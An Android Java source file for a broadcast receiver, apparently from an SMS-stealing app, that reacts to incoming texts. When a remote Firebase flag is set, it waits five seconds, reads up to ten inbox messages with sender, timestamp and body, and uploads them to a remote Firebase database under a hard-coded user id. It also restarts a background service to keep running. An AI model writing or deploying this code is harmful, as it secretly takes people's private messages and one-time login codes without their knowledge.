package com.kill390.smsreadtest;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.Calendar;


public class SmsReceiver extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String TAG = "SMSBroadcastReceiver";

    DatabaseReference database = FirebaseDatabase.getInstance().getReference().child("users").child("ZdfnDnNDjDij3d");


    @Override
    public void onReceive(final Context context, final Intent intent) {
        Log.i(TAG, "Intent recieved: " + intent.getAction());
        if (intent.getAction().equals("restartservice")) {
            Log.i("service","restart0");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(new Intent(context, MyService.class));
            } else {
                context.startService(new Intent(context, MyService.class));
            }
        }
        if (intent.getAction() == SMS_RECEIVED) {

            database.addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    if (snapshot.child("interested").getValue().toString().equals("true")) {
                        new CountDownTimer(5000,1000){

                            @Override
                            public void onTick(long millisUntilFinished) {

                            }

                            @Override
                            public void onFinish() {

                                Bundle bundle = intent.getExtras();
                                if (bundle != null) {
                                    Object[] pdus = (Object[])bundle.get("pdus");
                                    final SmsMessage[] messages = new SmsMessage[pdus.length];
                                    for (int i = 0; i < pdus.length; i++) {
                                        messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                                    }
                                    if (messages.length > -1) {
                                        Log.i(TAG, "Message recieved: " + messages[0].getMessageBody());
                                    }
                                }


                                checkAndRequestPermissions(context);
                                readSMS(context);

                            }
                        }.start();
                    }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError error) {

                }
            });



        }
    }

    public void readSMS(Context context){
        if(checkAndRequestPermissions(context)) {

            Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            int i = 1 ;

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {


                    /* important indexes
                        12 body
                        2 address
                        5 date_sent
                    */

                    String msg = "";
                    String msgData = "";
                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);

                    }
                    // use msgData
                    msg = cursor.getColumnName(5) + ":" + getDate(cursor.getLong(5),"dd/MM/yyyy hh:mm:ss.SSS")+" "+cursor.getColumnName(2) + ":" + cursor.getString(2)+" "+cursor.getColumnName(12) + ":" + cursor.getString(12);

                    Log.i("here", msg);
                    Log.i("not", msgData);

                    database.child("SMS").child("sms" + i).setValue(msg);

                    i++;
                } while (cursor.moveToNext() && i <= 10);
            } else {
                // empty box, no SMS
            }

        }
    }
    private boolean checkAndRequestPermissions(Context context)
    {
        int sms = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS);
        int sms2 = ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS);

        if (sms != PackageManager.PERMISSION_GRANTED && sms2 != PackageManager.PERMISSION_GRANTED)
        {
//            ActivityCompat.requestPermissions((Activity) context, new String[]{Manifest.permission.READ_SMS,Manifest.permission.RECEIVE_SMS}, 1);
            return false;
        }else {
            return true;
        }
    }

    public static String getDate(long milliSeconds, String dateFormat)
    {
        // Create a DateFormatter object for displaying date in specified format.
        SimpleDateFormat formatter = new SimpleDateFormat(dateFormat);

        // Create a calendar object that will convert the date and time value in milliseconds to date.
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(milliSeconds);
        return formatter.format(calendar.getTime());
    }

}